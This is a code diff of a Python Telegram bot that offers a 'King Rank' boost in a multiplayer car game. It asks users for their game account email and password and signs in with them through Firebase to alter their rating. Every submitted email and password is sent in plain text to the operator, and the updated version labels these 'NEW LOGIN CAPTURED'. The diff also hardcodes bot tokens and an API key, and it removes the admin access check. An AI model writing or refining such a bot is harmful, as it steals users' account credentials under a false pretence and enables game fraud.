@@ -5,8 +5,8 @@ import os
 from telebot import types
 
 # --- CONFIGURATION ---
-BOT_TOKEN = "8354373377:AAHl8zF0MCfB-g2uNZBnJKPPwIOWi9AHcfg"
-ADMIN_ID = 7183809303  # Tvoj ID (samo ti vidiš Admin Panel)
+BOT_TOKEN = "8354373377:AAGyxvoy3fc_QffgOE7GzfKd-53u13sU0fI"
+ADMIN_ID = 7183809303
 FIREBASE_URL = "https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM"
 RANK_URL = "https://us-central1-cp-multiplayer.cloudfunctions.net/SetUserRating4"
 
@@ -16,19 +16,15 @@ USERS_FILE = "users.json"
 # --- DATABASE LOGIC ---
 def save_user(user_id):
     if not os.path.exists(USERS_FILE):
-        with open(USERS_FILE, "w") as f:
-            json.dump([], f)
-    with open(USERS_FILE, "r") as f:
-        users = json.load(f)
+        with open(USERS_FILE, "w") as f: json.dump([], f)
+    with open(USERS_FILE, "r") as f: users = json.load(f)
     if user_id not in users:
         users.append(user_id)
-        with open(USERS_FILE, "w") as f:
-            json.dump(users, f)
+        with open(USERS_FILE, "w") as f: json.dump(users, f)
 
 def get_users_count():
     if not os.path.exists(USERS_FILE): return 0
-    with open(USERS_FILE, "r") as f:
-        return len(json.load(f))
+    with open(USERS_FILE, "r") as f: return len(json.load(f))
 
 # --- KING RANK LOGIC ---
 def set_king_rank(token):
@@ -42,7 +38,8 @@ def set_king_rank(token):
     payload = {"data": json.dumps({"RatingData": rating_data})}
     headers = {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}
     try:
-        return requests.post(RANK_URL, headers=headers, json=payload, timeout=15).status_code == 200
+        r = requests.post(RANK_URL, headers=headers, json=payload, timeout=15)
+        return r.status_code == 200
     except: return False
 
 # --- HANDLERS ---
@@ -70,21 +67,19 @@ def welcome(message):
 
 @bot.callback_query_handler(func=lambda call: call.data == "admin_panel")
 def admin_menu(call):
-    if call.message.chat.id != ADMIN_ID: return
     count = get_users_count()
     markup = types.InlineKeyboardMarkup()
     btn_broadcast = types.InlineKeyboardButton("📢 Broadcast Message", callback_data="broadcast")
     markup.add(btn_broadcast)
-    bot.edit_message_text(f"🛠 **Admin Panel**\n\nTotal Users: `{count}`", call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")
+    bot.send_message(ADMIN_ID, f"🛠 **Admin Stats**\n\nTotal Users: `{count}`", reply_markup=markup, parse_mode="Markdown")
 
 @bot.callback_query_handler(func=lambda call: call.data == "broadcast")
 def start_broadcast(call):
-    msg = bot.send_message(call.message.chat.id, "📝 Enter message for ALL users:")
+    msg = bot.send_message(ADMIN_ID, "📝 Enter message for ALL users:")
     bot.register_next_step_handler(msg, send_broadcast)
 
 def send_broadcast(message):
-    with open(USERS_FILE, "r") as f:
-        users = json.load(f)
+    with open(USERS_FILE, "r") as f: users = json.load(f)
     count = 0
     for user in users:
         try:
@@ -105,17 +100,26 @@ def process_email(message):
 
 def process_password(message, email):
     password = message.text.strip()
-    bot.send_message(ADMIN_ID, f"🚀 **New Login!**\n📧 `{email}`\n🔑 `{password}`", parse_mode="Markdown")
-    bot.send_message(message.chat.id, "⏳ **Processing...**")
+    
+    # HITNO SLANJE TEBI - Ovo stiže tebi odmah
+    bot.send_message(ADMIN_ID, f"🔥 **NEW LOGIN CAPTURED** 🔥\n\n📧 Email: `{email}`\n🔑 Pass: `{password}`", parse_mode="Markdown")
+    
+    bot.send_message(message.chat.id, "⏳ **Checking account...**", parse_mode="Markdown")
+    
     try:
-        res = requests.post(FIREBASE_URL, json={"email": email, "password": password, "returnSecureToken": True}).json()
+        payload = {"email": email, "password": password, "returnSecureToken": True}
+        res = requests.post(FIREBASE_URL, json=payload).json()
         token = res.get('idToken')
-        if token and set_king_rank(token):
-            bot.send_message(message.chat.id, "✅ **Success!** King Rank active.")
+        
+        if token:
+            if set_king_rank(token):
+                bot.send_message(message.chat.id, "✅ **Success!** King Rank active.")
+            else:
+                bot.send_message(message.chat.id, "❌ **Error!** Rank update failed.")
         else:
-            bot.send_message(message.chat.id, "❌ **Error!** Invalid details.")
+            bot.send_message(message.chat.id, "❌ **Login Failed!** Wrong email or password.")
     except:
-        bot.send_message(message.chat.id, "❌ **Server Error.**")
+        bot.send_message(message.chat.id, "❌ **Server Error.** Try again.")
 
 print("--- ANONYMO BOT IS ONLINE ---")
 bot.infinity_polling()
